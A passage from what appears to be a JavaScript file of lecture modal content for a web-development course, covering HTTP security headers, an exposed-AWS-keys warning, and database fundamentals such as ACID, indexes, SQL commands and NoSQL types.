                        <p>Block common backup extensions in web server config. Never create backups in web-accessible directories.</p>
                    </div>
                `
            },
            // API Key Horror Story
            'api-key-horror': {
                title: 'AWS Keys on GitHub — Horror Stories',
                body: `
                    <p>Real stories of developers losing thousands to crypto miners.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">How Fast Are Keys Found?</div>
                        <ul>
                            <li>Bots scan GitHub in real-time</li>
                            <li>Average time to compromise: <strong>under 1 minute</strong></li>
                            <li>Automated crypto mining starts immediately</li>
                            <li>Bills can reach $50,000+ overnight</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">AWS Response</div>
                        <p>AWS now scans GitHub themselves and auto-quarantines exposed keys. But damage often done before detection.</p>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Prevention</div>
                        <ul>
                            <li>Never commit credentials</li>
                            <li>Use environment variables</li>
                            <li>Enable AWS billing alerts</li>
                            <li>Use IAM roles with minimal permissions</li>
                        </ul>
                    </div>
                `
            },
            // Security Headers
            'header-hsts': {
                title: 'Strict-Transport-Security (HSTS)',
                body: `
                    <p>Force browser to always use HTTPS.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// Browser remembers for 1 year
// All subdomains must use HTTPS
// Can be added to browser preload list</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Prevents</div>
                        <ul>
                            <li>SSL stripping attacks</li>
                            <li>Accidental HTTP requests</li>
                            <li>Mixed content issues</li>
                        </ul>
                    </div>
                `
            },
            'header-cto': {
                title: 'X-Content-Type-Options',
                body: `
                    <p>Prevent browsers from MIME-sniffing responses.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>X-Content-Type-Options: nosniff

// Without this, browsers might:
// - Treat image as HTML (if it contains HTML)
// - Execute JavaScript from non-JS content types
// - Enable XSS via content type confusion</code></pre>
                    </div>
                `
            },
            'header-xfo': {
                title: 'X-Frame-Options',
                body: `
                    <p>Prevent your page from being embedded in iframes.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>X-Frame-Options: DENY           // Never allow framing
X-Frame-Options: SAMEORIGIN     // Only same origin

// Prevents clickjacking:
// Attacker overlays invisible iframe of your site
// User clicks attacker's button
// Actually clicking your "Delete Account" button</code></pre>
                    </div>
                `
            },
            'header-referrer': {
                title: 'Referrer-Policy',
                body: `
                    <p>Control how much referrer information is sent.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>Referrer-Policy: strict-origin-when-cross-origin

// Same-origin: full URL sent
// Cross-origin HTTPS→HTTPS: origin only
// HTTPS→HTTP: nothing sent

// Prevents leaking:
// - URL paths with sensitive data
// - Query parameters with tokens
// - Internal URL structure</code></pre>
                    </div>
                `
            },
            'header-permissions': {
                title: 'Permissions-Policy',
                body: `
                    <p>Disable browser features you don't need.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>Permissions-Policy: geolocation=(), camera=(), microphone=()

// Disable features completely:
// - geolocation=() — no location access
// - camera=() — no camera access
// - payment=() — no Payment API

// If XSS occurs, attacker can't:
// - Access user's location
// - Activate camera/microphone
// - Use payment APIs</code></pre>
                    </div>
                `
            },

            // ==========================================
            // DATABASE LECTURE MODALS
            // ==========================================

            // Why Databases Matter
            'db-importance-persistence': {
                title: 'Data Persistence',
                body: `
                    <p>Without a database, your data lives only in <strong>memory</strong>. When the app restarts, crashes, or redeploys — it's all gone.</p>
                    <div class="modal-section">
                        <h4>In-Memory vs Persistent</h4>
                        <div class="modal-code-block">
                            <pre class="modal-code"><code>// In-memory (lost on restart)
let users = [];
users.push({ name: 'Alice' });
// Server restarts... users = []

// Database (survives anything)
await db.query('INSERT INTO users (name) VALUES ($1)', ['Alice']);
// Server restarts... data still there!</code></pre>
                        </div>
                    </div>
                    <div class="modal-section">
                        <h4>Databases Handle</h4>
                        <ul>
                            <li>Writing data to disk reliably</li>
                            <li>Recovery after crashes (write-ahead logs)</li>
                            <li>Replication across multiple machines</li>
                            <li>Backup and restore capabilities</li>
                        </ul>
                    </div>
                `
            },
            'db-importance-concurrent': {
                title: 'Concurrent Access',
                body: `
                    <p>Multiple users accessing the same data simultaneously creates <strong>race conditions</strong>. Databases solve this with locking and transactions.</p>
                    <div class="modal-section">
                        <h4>The Problem</h4>
                        <div class="modal-code-block">
                            <pre class="modal-code"><code>// Two users buying the last item simultaneously
// Without proper handling:
User A: reads stock = 1
User B: reads stock = 1
User A: stock > 0? yes! purchase!
User B: stock > 0? yes! purchase!
// Both think they bought it! Stock is now -1</code></pre>
                        </div>
                    </div>
                    <div class="modal-section">
                        <h4>Database Solution</h4>
                        <div class="modal-code-block">
                            <pre class="modal-code"><code>// Transaction with row locking
BEGIN;
SELECT stock FROM products WHERE id = 1 FOR UPDATE;
-- Row is now locked, other transactions wait
UPDATE products SET stock = stock - 1 WHERE id = 1 AND stock > 0;
COMMIT;
-- Lock released, next transaction can proceed</code></pre>
                        </div>
                    </div>
                `
            },
            'db-importance-query': {
                title: 'Efficient Queries',
                body: `
                    <p>Databases use <strong>indexes</strong> and <strong>query optimization</strong> to find data incredibly fast — even across billions of records.</p>
                    <div class="modal-section">
                        <h4>Without Index (Full Table Scan)</h4>
                        <div class="modal-code-block">
                            <pre class="modal-code"><code>SELECT * FROM users WHERE email = 'alice@example.com';
-- Must check every single row
-- 10 million users = 10 million comparisons
-- Time: 5-10 seconds</code></pre>
                        </div>
                    </div>
                    <div class="modal-section">
                        <h4>With Index (B-Tree Lookup)</h4>
                        <div class="modal-code-block">
                            <pre class="modal-code"><code>CREATE INDEX idx_users_email ON users(email);

SELECT * FROM users WHERE email = 'alice@example.com';
-- B-tree index lookup
-- 10 million users = ~24 comparisons (log₂ 10M)
-- Time: < 1 millisecond</code></pre>
                        </div>
                    </div>
                `
            },
            'db-importance-integrity': {
                title: 'Data Integrity',
                body: `
                    <p>Databases enforce <strong>constraints</strong> at the data layer — invalid data can't even be stored.</p>
                    <div class="modal-section">
                        <h4>Types of Constraints</h4>
                        <div class="modal-code-block">
                            <pre class="modal-code"><code>CREATE TABLE orders (
  id SERIAL PRIMARY KEY,              -- Unique identifier
  user_id INT NOT NULL                -- Can't be empty
    REFERENCES users(id),             -- Must exist in users table
  amount DECIMAL CHECK (amount > 0),  -- Must be positive
  email VARCHAR(255) UNIQUE,          -- No duplicates
  status VARCHAR(20) DEFAULT 'pending'
);

-- Database REJECTS:
INSERT INTO orders (user_id, amount) VALUES (999, 100);
-- Error: user_id 999 doesn't exist (foreign key violation)

INSERT INTO orders (user_id, amount) VALUES (1, -50);
-- Error: amount must be > 0 (check constraint violation)</code></pre>
                        </div>
                    </div>
                `
            },

            // Database History Eras
            'db-era-1960s': {
                title: 'Hierarchical Databases (1960s)',
                body: `
                    <p>The first database model, developed by IBM for the Apollo space program.</p>
                    <div class="modal-section">
                        <h4>Structure</h4>
                        <p>Data organized in a <strong>tree structure</strong> — parent-child relationships. Each child has exactly one parent.</p>
                        <div class="modal-code-block">
                            <pre class="modal-code"><code>Company
├── Department: Engineering
│   ├── Employee: Alice
│   └── Employee: Bob
└── Department: Sales
    └── Employee: Carol</code></pre>
                        </div>
                    </div>
                    <div class="modal-section">
                        <h4>IBM IMS (1966)</h4>
                        <ul>
                            <li>Information Management System</li>
                            <li>Still in use today at banks and airlines!</li>
                            <li>Handles millions of transactions per second</li>
                            <li>Limited flexibility — structure is rigid</li>
                        </ul>
                    </div>
                `
            },
            'db-era-1970s': {
                title: 'Relational Model (1970s)',
                body: `
                    <p><strong>Edgar F. Codd</strong> at IBM published "A Relational Model of Data for Large Shared Data Banks" in 1970 — one of the most influential papers in computing history.</p>
                    <div class="modal-section">
                        <h4>Key Ideas</h4>
                        <ul>
                            <li><strong>Tables (relations)</strong> — data in rows and columns</li>
                            <li><strong>No physical pointers</strong> — relationships through keys</li>
                            <li><strong>Declarative queries</strong> — say WHAT you want, not HOW</li>
                            <li><strong>Mathematical foundation</strong> — set theory and predicate logic</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>IBM's Missed Opportunity</h4>
                        <p>IBM was slow to commercialize Codd's work (IMS was profitable). Larry Ellison read Codd's papers and founded Oracle in 1977, beating IBM to market.</p>
                    </div>
                `
            },
            'db-era-1980s': {
                title: 'SQL Standardization (1980s)',
                body: `
                    <p>SQL became the standard query language, enabling portability across database systems.</p>
                    <div class="modal-section">
                        <h4>Timeline</h4>
                        <ul>
                            <li><strong>1979</strong> — Oracle V2 (first commercial SQL database)</li>
                            <li><strong>1983</strong> — IBM DB2</li>
                            <li><strong>1986</strong> — SQL-86 (first ANSI standard)</li>
                            <li><strong>1989</strong> — Microsoft SQL Server</li>
                            <li><strong>1996</strong> — PostgreSQL (open source)</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Why SQL Won</h4>
                        <p>Declarative, human-readable, standardized. You could switch databases without rewriting all your queries. The same basic SQL works on Oracle, PostgreSQL, MySQL, SQL Server.</p>
                    </div>
                `
            },
            'db-era-2000s': {
                title: 'NoSQL Movement (2000s)',
                body: `
                    <p>Web scale companies hit the limits of relational databases. Google, Amazon, Facebook created new solutions.</p>
                    <div class="modal-section">
                        <h4>The Trigger: Web Scale</h4>
                        <ul>
                            <li><strong>2004</strong> — Google BigTable paper</li>
                            <li><strong>2007</strong> — Amazon Dynamo paper</li>
                            <li><strong>2009</strong> — MongoDB founded</li>
                            <li><strong>2009</strong> — Redis released</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>NoSQL Characteristics</h4>
                        <ul>
                            <li><strong>Horizontal scaling</strong> — add more servers</li>
                            <li><strong>Flexible schemas</strong> — no rigid table structure</li>
                            <li><strong>BASE vs ACID</strong> — eventual consistency acceptable</li>
                            <li><strong>Specialized</strong> — optimized for specific use cases</li>
                        </ul>
                    </div>
                `
            },
            'db-era-2010s': {
                title: 'NewSQL & Distributed SQL (2010s+)',
                body: `
                    <p>The best of both worlds: SQL semantics with NoSQL scalability.</p>
                    <div class="modal-section">
                        <h4>The Problem</h4>
                        <p>NoSQL gave up too much. Developers missed joins, transactions, and SQL. But they needed scale.</p>
                    </div>
                    <div class="modal-section">
                        <h4>NewSQL Solutions</h4>
                        <ul>
                            <li><strong>CockroachDB</strong> — Distributed PostgreSQL-compatible</li>
                            <li><strong>TiDB</strong> — MySQL-compatible, horizontal scale</li>
                            <li><strong>Spanner</strong> — Google's globally distributed SQL</li>
                            <li><strong>PlanetScale</strong> — Serverless MySQL with branching</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Also: Managed Services Boom</h4>
                        <p>AWS RDS, Supabase, Neon, Railway — databases as a service. No more managing servers.</p>
                    </div>
                `
            },

            // Relational Concepts
            'db-concept-table': {
                title: 'Tables (Relations)',
                body: `
                    <p>A table is a collection of related data organized into rows and columns.</p>
                    <div class="modal-section">
                        <h4>Terminology</h4>
                        <ul>
                            <li><strong>Table / Relation</strong> — the entire structure</li>
                            <li><strong>Row / Tuple / Record</strong> — one entry</li>
                            <li><strong>Column / Attribute / Field</strong> — one property</li>
                            <li><strong>Schema</strong> — the table's structure definition</li>
                        </ul>
                    </div>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>CREATE TABLE products (
  id SERIAL PRIMARY KEY,
  name VARCHAR(100) NOT NULL,
  price DECIMAL(10,2),
  category VARCHAR(50),
  in_stock BOOLEAN DEFAULT true
);</code></pre>
                    </div>
                `
            },
            'db-concept-pk': {
                title: 'Primary Key',
                body: `
                    <p>A column (or combination of columns) that <strong>uniquely identifies</strong> each row in a table.</p>
                    <div class="modal-section">
                        <h4>Properties</h4>
                        <ul>
                            <li><strong>Unique</strong> — no two rows can have the same PK</li>
                            <li><strong>Not null</strong> — every row must have a value</li>
                            <li><strong>Immutable</strong> — shouldn't change over time</li>
                        </ul>
                    </div>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- Auto-incrementing integer (most common)
id SERIAL PRIMARY KEY

-- UUID (better for distributed systems)
id UUID PRIMARY KEY DEFAULT gen_random_uuid()

-- Composite key (multiple columns)
PRIMARY KEY (user_id, product_id)</code></pre>
                    </div>
                `
            },
            'db-concept-fk': {
                title: 'Foreign Key',
                body: `
                    <p>A column that references another table's primary key, creating a <strong>relationship</strong> between tables.</p>
                    <div class="modal-section">
                        <h4>Relationship Types</h4>
                        <ul>
                            <li><strong>One-to-Many</strong> — one user has many posts</li>
                            <li><strong>One-to-One</strong> — one user has one profile</li>
                            <li><strong>Many-to-Many</strong> — users have many roles, roles have many users (needs junction table)</li>
                        </ul>
                    </div>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>CREATE TABLE posts (
  id SERIAL PRIMARY KEY,
  title VARCHAR(200),
  author_id INT REFERENCES users(id)
    ON DELETE CASCADE    -- delete posts if user deleted
    ON UPDATE CASCADE    -- update if user id changes
);

-- The database ENFORCES this relationship
-- You can't create a post with a non-existent author_id</code></pre>
                    </div>
                `
            },
            'db-concept-index': {
                title: 'Database Indexes',
                body: `
                    <p>An index is a <strong>data structure</strong> that speeds up data retrieval — like a book's index.</p>
                    <div class="modal-section">
                        <h4>How It Works</h4>
                        <p>A B-tree index maintains a sorted structure. Finding a value in 1 billion rows takes ~30 comparisons instead of 1 billion.</p>
                    </div>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- Create index on frequently queried columns
CREATE INDEX idx_users_email ON users(email);
CREATE INDEX idx_posts_author ON posts(author_id);

-- Composite index (for queries on multiple columns)
CREATE INDEX idx_orders_user_date ON orders(user_id, created_at);

-- Unique index (enforces uniqueness)
CREATE UNIQUE INDEX idx_users_email_unique ON users(email);</code></pre>
                    </div>
                    <div class="modal-section">
                        <h4>Trade-offs</h4>
                        <p>Indexes speed up reads but slow down writes (index must be updated). Don't index everything — only columns used in WHERE, JOIN, ORDER BY.</p>
                    </div>
                `
            },

            // ACID Properties
            'db-acid-atomicity': {
                title: 'Atomicity',
                body: `
                    <p>A transaction is <strong>all-or-nothing</strong>. Either every operation succeeds, or none do.</p>
                    <div class="modal-section">
                        <h4>Classic Example: Bank Transfer</h4>
                        <div class="modal-code-block">
                            <pre class="modal-code"><code>BEGIN TRANSACTION;
  -- Debit from account A
  UPDATE accounts SET balance = balance - 100 WHERE id = 'A';

  -- Credit to account B
  UPDATE accounts SET balance = balance + 100 WHERE id = 'B';
COMMIT;

-- If ANYTHING fails (crash, constraint violation, etc.)
-- the entire transaction is ROLLED BACK
-- Money is never "lost" between accounts</code></pre>
                        </div>
                    </div>
                `
            },
            'db-acid-consistency': {
                title: 'Consistency',
                body: `
                    <p>A transaction brings the database from one <strong>valid state to another</strong>. All constraints and rules are enforced.</p>
                    <div class="modal-section">
                        <h4>What Gets Enforced</h4>
                        <ul>
                            <li>Primary key uniqueness</li>
                            <li>Foreign key relationships</li>
                            <li>CHECK constraints</li>
                            <li>NOT NULL constraints</li>
                            <li>Triggers and rules</li>
                        </ul>
                    </div>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- Constraint: balance can't go negative
ALTER TABLE accounts
  ADD CONSTRAINT positive_balance CHECK (balance >= 0);

-- This transaction will FAIL
BEGIN;
  UPDATE accounts SET balance = balance - 1000
  WHERE id = 'A' AND balance = 500;
  -- Error: check constraint "positive_balance" violated
ROLLBACK; -- Automatic</code></pre>
                    </div>
                `
            },
            'db-acid-isolation': {
                title: 'Isolation',
                body: `
                    <p>Concurrent transactions execute as if they were <strong>running alone</strong>. One transaction doesn't see another's uncommitted changes.</p>
                    <div class="modal-section">
                        <h4>Isolation Levels</h4>
                        <ul>
                            <li><strong>Read Uncommitted</strong> — can see uncommitted changes (dirty reads)</li>
                            <li><strong>Read Committed</strong> — only see committed data (PostgreSQL default)</li>
                            <li><strong>Repeatable Read</strong> — same query returns same results within transaction</li>
                            <li><strong>Serializable</strong> — transactions appear to run one after another</li>
                        </ul>
                    </div>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- Set isolation level
SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;

BEGIN;
  SELECT stock FROM products WHERE id = 1; -- Returns 5
  -- Another transaction changes stock to 3
  SELECT stock FROM products WHERE id = 1; -- Still returns 5!
COMMIT;</code></pre>
                    </div>
                `
            },
            'db-acid-durability': {
                title: 'Durability',
                body: `
                    <p>Once a transaction commits, the data is <strong>permanently saved</strong> — even if the server crashes immediately after.</p>
                    <div class="modal-section">
                        <h4>How Databases Achieve This</h4>
                        <ul>
                            <li><strong>Write-Ahead Logging (WAL)</strong> — changes logged to disk before applied</li>
                            <li><strong>Checkpointing</strong> — periodic snapshots of database state</li>
                            <li><strong>fsync</strong> — forces OS to write to physical disk</li>
                            <li><strong>Replication</strong> — copies to other servers</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Recovery After Crash</h4>
                        <p>Database replays the WAL on startup. Committed transactions are restored, uncommitted ones are discarded. No manual intervention needed.</p>
                    </div>
                `
            },

            // SQL Categories
            'db-sql-ddl': {
                title: 'DDL — Data Definition Language',
                body: `
                    <p>Commands that <strong>define the structure</strong> of your database — tables, columns, indexes, constraints.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- CREATE — make new structures
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  name VARCHAR(100)
);
CREATE INDEX idx_name ON users(name);
CREATE VIEW active_users AS SELECT * FROM users WHERE active = true;

-- ALTER — modify existing structures
ALTER TABLE users ADD COLUMN email VARCHAR(255);
ALTER TABLE users ALTER COLUMN name SET NOT NULL;
ALTER TABLE users DROP COLUMN temporary_field;

-- DROP — remove structures
DROP TABLE IF EXISTS old_users CASCADE;
DROP INDEX idx_name;

-- TRUNCATE — empty a table (faster than DELETE)
TRUNCATE TABLE logs;</code></pre>
                    </div>
                `
            },
            'db-sql-dml': {
                title: 'DML — Data Manipulation Language',
                body: `
                    <p>Commands that <strong>modify data</strong> — insert, update, delete records.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- INSERT — add new records
INSERT INTO users (name, email) VALUES ('Alice', 'alice@example.com');
INSERT INTO users (name, email) VALUES
  ('Bob', 'bob@example.com'),
  ('Carol', 'carol@example.com');

-- UPDATE — modify existing records
UPDATE users SET email = 'new@example.com' WHERE id = 1;
UPDATE products SET price = price * 1.1; -- 10% price increase

-- DELETE — remove records
DELETE FROM users WHERE id = 1;
DELETE FROM sessions WHERE expires_at < NOW();

-- UPSERT — insert or update if exists
INSERT INTO users (email, name) VALUES ('alice@example.com', 'Alice')
ON CONFLICT (email) DO UPDATE SET name = EXCLUDED.name;</code></pre>
                    </div>
                `
            },
            'db-sql-dql': {
                title: 'DQL — Data Query Language',
                body: `
                    <p>Commands that <strong>retrieve data</strong> — SELECT in all its forms.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- Basic SELECT
SELECT name, email FROM users WHERE active = true;

-- JOINs — combine tables
SELECT u.name, p.title
FROM users u
INNER JOIN posts p ON u.id = p.author_id;

-- Aggregations
SELECT category, COUNT(*), AVG(price)
FROM products
GROUP BY category
HAVING COUNT(*) > 5;

-- Subqueries
SELECT * FROM users WHERE id IN (
  SELECT DISTINCT author_id FROM posts WHERE published = true
);

-- Window functions
SELECT name, salary,
  RANK() OVER (ORDER BY salary DESC) as salary_rank
FROM employees;</code></pre>
                    </div>
                `
            },

            // PostgreSQL Example
            'db-pg-example': {
                title: 'node-postgres (pg) Deep Dive',
                body: `
                    <p>The most popular PostgreSQL client for Node.js — low-level but powerful.</p>
                    <div class="modal-section">
                        <h4>Connection Pooling</h4>
                        <div class="modal-code-block">
                            <pre class="modal-code"><code>import { Pool } from 'pg';

// Pool manages connection reuse
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  max: 20,        // max connections in pool
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 2000,
});

// For simple queries, use pool directly
const result = await pool.query('SELECT * FROM users');

// For transactions, checkout a client
const client = await pool.connect();
try {
  await client.query('BEGIN');
  // ... multiple queries ...
  await client.query('COMMIT');
} catch (e) {
  await client.query('ROLLBACK');
  throw e;
} finally {
  client.release(); // Return to pool!
}</code></pre>
                        </div>
                    </div>
                `
            },

            // Relational Use Cases
            'db-rel-usecase-financial': {
                title: 'Financial Systems',
                body: `
                    <p>Money requires <strong>ACID guarantees</strong>. You can't have "eventual consistency" with bank balances.</p>
                    <div class="modal-section">
                        <h4>Why Relational Excels</h4>
                        <ul>
                            <li>Transactions ensure money isn't lost or duplicated</li>
                            <li>Constraints prevent negative balances</li>
                            <li>Audit trails with foreign keys</li>
                            <li>Decimal types for precise calculations</li>
                        </ul>
                    </div>
                `
            },
            'db-rel-usecase-complex': {
                title: 'Complex Relationships',
                body: `
                    <p>When entities have many interconnected relationships, relational databases shine.</p>
                    <div class="modal-section">
                        <h4>Example: E-commerce</h4>
                        <ul>
                            <li>Users have orders</li>
                            <li>Orders have line items</li>
                            <li>Line items reference products</li>
                            <li>Products have categories</li>
                            <li>Users have addresses (shipping, billing)</li>
                            <li>Orders have payments, shipments</li>
                        </ul>
                        <p>JOINs let you query across all these relationships efficiently.</p>
                    </div>
                `
            },
            'db-rel-usecase-reporting': {
                title: 'Ad-hoc Reporting',
                body: `
                    <p>SQL is incredibly powerful for answering questions you didn't anticipate.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- "How many orders per customer last month?"
SELECT customer_id, COUNT(*)
FROM orders
WHERE created_at > NOW() - INTERVAL '1 month'
GROUP BY customer_id;

-- "What's the revenue by category and region?"
SELECT p.category, c.region, SUM(o.total)
FROM orders o
JOIN products p ON o.product_id = p.id
JOIN customers c ON o.customer_id = c.id
GROUP BY p.category, c.region;</code></pre>
                    </div>
                    <p>With NoSQL, you often need to pre-compute these aggregations.</p>
                `
            },
            'db-rel-usecase-integrity': {
                title: 'Data Integrity Critical',
                body: `
                    <p>When bad data is worse than no data, use relational constraints.</p>
                    <div class="modal-section">
                        <h4>Healthcare, Legal, Government</h4>
                        <ul>
                            <li>Patient records must be complete and accurate</li>
                            <li>Legal documents can't reference non-existent cases</li>
                            <li>Regulatory compliance requires data validation</li>
                        </ul>
                        <p>The database becomes your last line of defense against bad data.</p>
                    </div>
                `
            },
            'db-rel-usecase-structured': {
                title: 'Well-Defined Schema',
                body: `
                    <p>When you know your data structure upfront and it's unlikely to change drastically.</p>
                    <div class="modal-section">
                        <h4>Benefits of Fixed Schema</h4>
                        <ul>
                            <li>Documentation built into the database</li>
                            <li>Type safety at the data layer</li>
                            <li>Query optimization based on known structure</li>
                            <li>Easier to reason about and maintain</li>
                        </ul>
                    </div>
                `
            },

            // Specific Databases
            'db-postgresql': {
                title: 'PostgreSQL',
                body: `
                    <p>The "world's most advanced open source relational database." Incredibly feature-rich and reliable.</p>
                    <div class="modal-section">
                        <h4>Why Developers Love It</h4>
                        <ul>
                            <li><strong>JSONB</strong> — store JSON with indexing (best of both worlds)</li>
                            <li><strong>Full-text search</strong> — built-in, no Elasticsearch needed for simple cases</li>
                            <li><strong>Extensions</strong> — PostGIS for geo, pg_vector for AI, TimescaleDB for time-series</li>
                            <li><strong>Standards compliant</strong> — most SQL-compliant database</li>
                            <li><strong>Battle-tested</strong> — 35+ years of development</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Used By</h4>
                        <p>Apple, Spotify, Instagram, Reddit, Twitch, NASA</p>
                    </div>
                `
            },
            'db-mysql': {
                title: 'MySQL',
                body: `
                    <p>The most popular open source database. Powers most of the web.</p>
                    <div class="modal-section">
                        <h4>Strengths</h4>
                        <ul>
                            <li>Simple to set up and use</li>
                            <li>Excellent read performance</li>
                            <li>Huge community, tons of resources</li>
                            <li>Great replication support</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Used By</h4>
                        <p>Facebook, Twitter, YouTube, Netflix, Airbnb, Uber</p>
                    </div>
                    <div class="modal-section">
                        <h4>MySQL vs PostgreSQL</h4>
                        <p>MySQL is simpler and faster for basic workloads. PostgreSQL has more features and stricter standards compliance. Both are excellent choices.</p>
                    </div>
                `
            },
            'db-sqlite': {
                title: 'SQLite',
                body: `
                    <p>A serverless, embedded database in a single file. The most deployed database in the world.</p>
                    <div class="modal-section">
                        <h4>Perfect For</h4>
                        <ul>
                            <li>Mobile apps (iOS, Android)</li>
                            <li>Desktop applications</li>
                            <li>Embedded systems</li>
                            <li>Development and testing</li>
                            <li>Single-server web apps</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Not Ideal For</h4>
                        <ul>
                            <li>High-concurrency writes</li>
                            <li>Multi-server deployments</li>
                            <li>Very large datasets (>1TB)</li>
                        </ul>
                    </div>
                    <p>Every iPhone, Android phone, Mac, Windows PC, and most browsers have SQLite built in.</p>
                `
            },

            // NoSQL Types
            'db-nosql-document': {
                title: 'Document Databases',
                body: `
                    <p>Store data as <strong>JSON-like documents</strong>. Each document can have a different structure.</p>
                    <div class="modal-section">
                        <h4>When to Use</h4>
                        <ul>
                            <li>Content management systems</li>
                            <li>User profiles with varying fields</li>
                            <li>Catalogs with different product types</li>
                            <li>Event logging</li>
                            <li>Rapid prototyping</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Key Players</h4>
                        <ul>
                            <li><strong>MongoDB</strong> — most popular, great tooling</li>
                            <li><strong>CouchDB</strong> — HTTP API, good offline sync</li>
                            <li><strong>Firebase Firestore</strong> — real-time, mobile-first</li>
                        </ul>
                    </div>
                `
            },
            'db-nosql-keyvalue': {
                title: 'Key-Value Stores',
                body: `
                    <p>The simplest model: a key maps to a value. Like a giant hash table.</p>
                    <div class="modal-section">
                        <h4>When to Use</h4>
                        <ul>
                            <li>Caching (database query results, API responses)</li>
                            <li>Session storage</li>
                            <li>Rate limiting counters</li>
                            <li>Real-time leaderboards</li>
                            <li>Pub/sub messaging</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Key Players</h4>
                        <ul>
                            <li><strong>Redis</strong> — in-memory, rich data types</li>
                            <li><strong>DynamoDB</strong> — AWS managed, infinite scale</li>
                            <li><strong>Memcached</strong> — simple, distributed caching</li>
                        </ul>
                    </div>
                `
            },
            'db-nosql-graph': {
                title: 'Graph Databases',
                body: `
                    <p>Data stored as <strong>nodes and edges</strong>. Relationships are first-class citizens.</p>
                    <div class="modal-section">
                        <h4>When to Use</h4>
                        <ul>
                            <li>Social networks (friends, followers)</li>
                            <li>Recommendation engines</li>
                            <li>Fraud detection</li>
                            <li>Knowledge graphs</li>
                            <li>Network/dependency analysis</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Key Players</h4>
                        <ul>
                            <li><strong>Neo4j</strong> — most popular, Cypher query language</li>
                            <li><strong>Amazon Neptune</strong> — managed graph service</li>
                            <li><strong>Dgraph</strong> — distributed, GraphQL native</li>
                        </ul>
                    </div>
                `
            },
            'db-nosql-columnar': {
                title: 'Column-Family Stores',
                body: `
                    <p>Data stored by columns rather than rows. Optimized for analytical queries.</p>
                    <div class="modal-section">
                        <h4>When to Use</h4>
                        <ul>
                            <li>Write-heavy workloads</li>
                            <li>Time-series data at massive scale</li>
                            <li>IoT sensor data</li>
                            <li>Log aggregation</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Key Players</h4>
                        <ul>
                            <li><strong>Apache Cassandra</strong> — Netflix, Apple scale</li>
                            <li><strong>HBase</strong> — Hadoop ecosystem</li>
                            <li><strong>ScyllaDB</strong> — C++ Cassandra alternative</li>
                        </ul>
                    </div>
                `
            },
            'db-nosql-timeseries': {
                title: 'Time-Series Databases',
                body: `
                    <p>Optimized for <strong>timestamped data</strong> — metrics, logs, IoT readings.</p>
                    <div class="modal-section">
                        <h4>When to Use</h4>
                        <ul>
                            <li>Application metrics and monitoring</li>
                            <li>Financial tick data</li>
                            <li>IoT sensor readings</li>
                            <li>Log analytics</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Key Players</h4>
                        <ul>
                            <li><strong>InfluxDB</strong> — purpose-built time-series</li>
                            <li><strong>TimescaleDB</strong> — PostgreSQL extension</li>
                            <li><strong>Prometheus</strong> — metrics and alerting</li>
                            <li><strong>ClickHouse</strong> — analytics at scale</li>
                        </ul>
                    </div>
                `
            },
            'db-nosql-search': {
                title: 'Search Engines',
                body: `
                    <p>Optimized for <strong>full-text search</strong> and complex queries over text data.</p>
                    <div class="modal-section">
                        <h4>When to Use</h4>
                        <ul>
                            <li>Product search with facets and filters</li>
                            <li>Log analysis and aggregation</li>
                            <li>Autocomplete and suggestions</li>
                            <li>Fuzzy matching and typo tolerance</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Key Players</h4>
                        <ul>
                            <li><strong>Elasticsearch</strong> — most popular, powerful but complex</li>
                            <li><strong>Meilisearch</strong> — simple, fast, developer-friendly</li>
                            <li><strong>Algolia</strong> — SaaS, instant search</li>
                            <li><strong>Typesense</strong> — open source Algolia alternative</li>
                        </ul>
                    </div>
                `
            },

            // MongoDB Features
            'db-mongo-flexible': {
                title: 'Flexible Schema',
                body: `
                    <p>Documents in the same collection can have <strong>different fields</strong>. Great for evolving data models.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Same collection, different structures
{ type: "blog", title: "Hello", content: "..." }
{ type: "video", title: "Demo", url: "...", duration: 120 }
{ type: "podcast", title: "Interview", episodes: [...] }

// Add fields without migrations
// Old documents don't need the new field</code></pre>
                    </div>
                `
            },
            'db-mongo-nested': {
                title: 'Nested/Embedded Data',
                body: `
                    <p>Embed related data directly in the document. <strong>One read fetches everything.</strong></p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Instead of JOIN across 3 tables:
{
  _id: "user123",
  name: "Alice",
  address: {           // Embedded document
